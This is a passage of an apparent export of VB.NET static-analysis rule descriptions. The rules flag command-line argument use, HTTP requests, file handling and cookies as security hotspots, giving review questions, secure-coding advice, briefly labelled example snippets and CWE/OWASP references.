<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",vbnet:S4823,vbnet,VB.NET,"<pre>
Module Program
    Sub Main(args As String()) ' Questionable as there is a reference to ""args"" in the procedure.
        Console.WriteLine(args(0))
    End Sub
End Module
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Dim client As System.Net.Http.HttpClient
' All the following are Questionable
client.GetAsync(...)
client.GetByteArrayAsync(...)
client.GetStreamAsync(...)
client.GetStringAsync(...)
client.SendAsync(...)
client.PostAsync(...)
client.PutAsync(...)
client.DeleteAsync(...)


Dim webclient As System.Net.WebClient
' All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
webclient.Download*(...) ' Any method starting with ""Download""
webclient.Open*(...) ' Any method starting with ""Open""
webclient.Upload*(...) ' Any method starting with ""Upload""

' All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
System.Net.WebRequest.Create(...)
System.Net.WebRequest.CreateDefault(...)

' The following is always Questionable
System.Net.WebRequest.CreateHttp(...)

' === RestSharp ===
' Questionable, as well as any other instantiation of the RestSharp.IRestRequest interface.
Dim rsRequest = new RestSharp.RestRequest(...)
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",vbnet:S4825,vbnet,VB.NET,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Dim client As System.Net.Http.HttpClient
' All the following are Questionable
client.GetAsync(...)
client.GetByteArrayAsync(...)
client.GetStreamAsync(...)
client.GetStringAsync(...)
client.SendAsync(...)
client.PostAsync(...)
client.PutAsync(...)
client.DeleteAsync(...)


Dim webclient As System.Net.WebClient
' All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
webclient.Download*(...) ' Any method starting with ""Download""
webclient.Open*(...) ' Any method starting with ""Open""
webclient.Upload*(...) ' Any method starting with ""Upload""

' All the following are Questionable, although they may be false positives if the URI scheme is ""ftp"" or ""file""
System.Net.WebRequest.Create(...)
System.Net.WebRequest.CreateDefault(...)

' The following is always Questionable
System.Net.WebRequest.CreateHttp(...)

' === RestSharp ===
' Questionable, as well as any other instantiation of the RestSharp.IRestRequest interface.
Dim rsRequest = new RestSharp.RestRequest(...)
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Sending HTTP requests is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.IO
Imports Microsoft.Win32.SafeHandles
Imports System.Security.AccessControl
Imports System.IO.Compression
Imports System.IO.IsolatedStorage
Imports System.IO.MemoryMappedFiles

' Use interop to call the CreateFile function.
' For more information about CreateFile,
' see the unmanaged MSDN reference library.
&lt;DllImport(""kernel32.dll"", SetLastError:=True, CharSet:=CharSet.Unicode)&gt;
Private Shared Function CreateFile(ByVal lpFileName As String, ByVal dwDesiredAccess As UInteger,
    ByVal dwShareMode As UInteger, ByVal lpSecurityAttributes As IntPtr, ByVal dwCreationDisposition As UInteger,
    ByVal dwFlagsAndAttributes As UInteger, ByVal hTemplateFile As IntPtr) As SafeFileHandle
End Function


' Review any static method call of File and Directory
File.Exists(""test.txt"") ' Questionable
Directory.Exists(""test"") ' Questionable

' Review any instantiation of FileInfo and DirectoryInfo and check how they are used
new FileInfo(""test.txt"") ' Questionable
new DirectoryInfo(""test"") ' Questionable

' Review the creation of SafeFileHandle and how it is used.
SafeFileHandle handle = CreateFile(...) ' Questionable, using the imported function
new SafeFileHandle(IntPtr.Zero, false) ' Questionable

' Questionable: review the creation of FileStream and other Streams accepting a file path.
new FileStream(""test.txt"", FileMode.Create)

new StreamWriter(""test.txt"", ...) ' Questionable
new StreamReader(""test.txt"", ...) ' Questionable

' Review those two methods as they create file and directories.
Path.GetTempFileName() ' Questionable
Path.GetTempPath() ' Questionable

new FileSecurity(""test.txt"", AccessControlSections.All) ' Questionable

' Review all calls to static methods of ZipFile as they create file and/or directories
ZipFile.CreateFromDirectory(""test.txt"", ""test.zip"") ' Questionable

' Review all calls to static methods of IsolatedStorageFile
IsolatedStorageFile.GetMachineStoreForApplication() ' Questionable

' Review all instantiation of IsolatedStorageFileStream and how they are used
new IsolatedStorageFileStream(""test.txt"", ...) ' Questionable

' Review all Create* and Open* static methods of MemoryMappedFile and how the resulting file is used
MemoryMappedFile.CreateFromFile(""test.txt"") ' Questionable
</pre>
<h2>Exceptions</h2>
<p>The creation of <code>FileStream</code> from a <code>SafeFileHandle</code> won't raise an issue as the creation of <code>SafeFileHandle</code>
already raised one.</p>
<p>Only the creation of <code>StreamWriter</code> or <code>StreamReader</code> from a string path will raise an issue for the same reason.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4797,vbnet,VB.NET,"<p>Handling files is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0358"">CVE-2018-0358</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7560"">CVE-2017-7560</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4015"">CVE-2005-4015</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3835"">CVE-2018-3835</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8008"">CVE-2018-8008</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2320"">CVE-2010-2320</a> </li>
</ul>
<p>Any access to the file system can create a vulnerability. Exposing a file's content, path or even its existence or absence is dangerous. It is also
extremely risky to create or write files without making sure that their permission and content is safe and controlled. Using a file path or reading a
file content must be always done with caution as they could have been tampered with.</p>
<p>The file system is a resource which can be easily exhausted. Opening too many files will use up all file descriptors, preventing other software
from opening files. Filling the storage space will also prevent any additional write from happening.</p>
<p>This rule flags code that initiates the use of files. The goal is to guide manual security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the file or directory path you are using is coming from a user input or could have been tampered with. </li>
  <li> the code exposes to an unauthorized person the existence of a file or directory. Any hint given to a user might be dangerous. The information
  could be given by displaying an error if the file/directory does not exist or just by returning an ""Unauthorized"" error when the file/directory
  exists but the person can't perform an action. </li>
  <li> the code exposes to an unauthorized person the paths of files and/or directories, for example by listing the content of a directory and
  displaying the output. </li>
  <li> a file or directory may be created with the wrong permissions. </li>
  <li> an unvalidated user input is written into a file. </li>
  <li> a file is read and its content is used without being validated. </li>
  <li> a file is read and its content is exposed to an unauthorized person. </li>
  <li> a file is open, created or written into each time a user performs an action. </li>
  <li> files are open and not closed before executing a child process. This is only dangerous if file descriptors are inherited in your programming
  language (example: C, C++). </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid using paths provided by users or other untrusted sources if possible. If this is required, check that the path does not reference an
unauthorized directory or file. See <a href=""https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)"">OWASP
recommendations</a> as to how to test for directory traversal. Note that the paths length should be validated too.</p>
<p>No File and directory names should be exposed. They can contain sensitive information. This means that a user should not be able to list the
content of unauthorized directories.</p>
<p>Make sure that no attackers can test for the existence or absence of sensitive files. Knowing that a specific file exists can reveal a
vulnerability or at least expose file and directory names.</p>
<p>Files and directories should be created with restricted permissions and ownership. Only authorized users and applications should be able to access
the files, and they should have as little permissions as needed. Modifying a file's permissions is not good enough. The permissions should be
restricted from the very beginning.</p>
<p>Writing user input into files should be done with caution. It could fill the storage space if the amount of data written is not controlled. It
could also write dangerous data which will later be used by an application or returned to another user. This is why the user input should be validated
before being written.</p>
<p>Reading a file can lead to other vulnerabilities. Any file could have been modified by an attacker. Thus the same validation as for any user input
should be performed on file content.</p>
<p>Once a file is read, its content should only be exposed to authorized users.</p>
<p>Add limits to the number of files your application access simultaneously or create because of a user action. It is possible to perform a Denial of
Service attack by opening too many files, and thus exhausting available file descriptors, or by filling the file system with new files. Release file
descriptors by closing files as soon as possible.</p>
<p>We also recommended to have tools monitoring your system and alerting you whenever resources are nearly exhausted.</p>
<p>Do not allow untrusted code to access the filesystem. For some programming languages, child-processes may have access to file descriptors opened by
the parent process before the creation of the child process. This creates a vulnerability when a child process doesn't have the permission to access a
file but is still able to modify it via the inherited file descriptor. Check your language documentation for ""file descriptor leak"" or the use of the
flags <code>O_CLOEXEC</code>, <code>FD_CLOEXEC</code>, or <code>bInheritHandles</code>. File descriptors can be inherited in the following languages:
C, C++, C#, Objective-C, Swift, Go (but disabled by default), some JVM versions, Javascript and TypeScript in Nodejs, Some PHP versions, Python, Ruby,
Rust, VB6 and VB.NET.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.IO
Imports Microsoft.Win32.SafeHandles
Imports System.Security.AccessControl
Imports System.IO.Compression
Imports System.IO.IsolatedStorage
Imports System.IO.MemoryMappedFiles

' Use interop to call the CreateFile function.
' For more information about CreateFile,
' see the unmanaged MSDN reference library.
&lt;DllImport(""kernel32.dll"", SetLastError:=True, CharSet:=CharSet.Unicode)&gt;
Private Shared Function CreateFile(ByVal lpFileName As String, ByVal dwDesiredAccess As UInteger,
    ByVal dwShareMode As UInteger, ByVal lpSecurityAttributes As IntPtr, ByVal dwCreationDisposition As UInteger,
    ByVal dwFlagsAndAttributes As UInteger, ByVal hTemplateFile As IntPtr) As SafeFileHandle
End Function


' Review any static method call of File and Directory
File.Exists(""test.txt"") ' Questionable
Directory.Exists(""test"") ' Questionable

' Review any instantiation of FileInfo and DirectoryInfo and check how they are used
new FileInfo(""test.txt"") ' Questionable
new DirectoryInfo(""test"") ' Questionable

' Review the creation of SafeFileHandle and how it is used.
SafeFileHandle handle = CreateFile(...) ' Questionable, using the imported function
new SafeFileHandle(IntPtr.Zero, false) ' Questionable

' Questionable: review the creation of FileStream and other Streams accepting a file path.
new FileStream(""test.txt"", FileMode.Create)

new StreamWriter(""test.txt"", ...) ' Questionable
new StreamReader(""test.txt"", ...) ' Questionable

' Review those two methods as they create file and directories.
Path.GetTempFileName() ' Questionable
Path.GetTempPath() ' Questionable

new FileSecurity(""test.txt"", AccessControlSections.All) ' Questionable

' Review all calls to static methods of ZipFile as they create file and/or directories
ZipFile.CreateFromDirectory(""test.txt"", ""test.zip"") ' Questionable

' Review all calls to static methods of IsolatedStorageFile
IsolatedStorageFile.GetMachineStoreForApplication() ' Questionable

' Review all instantiation of IsolatedStorageFileStream and how they are used
new IsolatedStorageFileStream(""test.txt"", ...) ' Questionable

' Review all Create* and Open* static methods of MemoryMappedFile and how the resulting file is used
MemoryMappedFile.CreateFromFile(""test.txt"") ' Questionable
</pre>
<h2>Exceptions</h2>
<p>The creation of <code>FileStream</code> from a <code>SafeFileHandle</code> won't raise an issue as the creation of <code>SafeFileHandle</code>
already raised one.</p>
<p>Only the creation of <code>StreamWriter</code> or <code>StreamReader</code> from a string path will raise an issue for the same reason.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/732"">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/73"">MITRE, CWE-73</a> - External Control of File Name or Path </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/538"">MITRE, CWE-538</a> - File and Directory Information Exposure </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/403"">MITRE, CWE-403</a> - Exposure of File Descriptor to Unintended Control Sphere ('File
  Descriptor Leak') </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Handling files is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
' === .NET Framework ===
Dim myCookie As HttpCookie = New HttpCookie(""UserSettings"")
myCookie(""CreditCardNumber"") = ""1234 1234 1234 1234"" ' Questionable
myCookie.Values(""password"") = ""5678"" ' Questionable
myCookie.Value = ""mysecret"" ' Questionable
...
Response.Cookies.Add(myCookie)

If Request.Cookies(""myCookie"") IsNot Nothing AndAlso Request.Cookies(""myCookie"")(""myValue"") IsNot Nothing Then ' Questionable
    Dim value As String = Request.Cookies(""myCookie"")(""myValue"") ' Questionable
    value = Request.Cookies(""myCookie"").Values(""myValue"") ' Questionable
End If

Dim value2 As String = Request.Cookies(""myCookie2"").Value ' Questionable

' === .NET Core ===
Response.Headers.Add(""Set-Cookie"", ...) ' Questionable
Response.Cookies.Append(""mykey"", ""myValue"") ' Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",vbnet:S2255,vbnet,VB.NET,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
' === .NET Framework ===
Dim myCookie As HttpCookie = New HttpCookie(""UserSettings"")
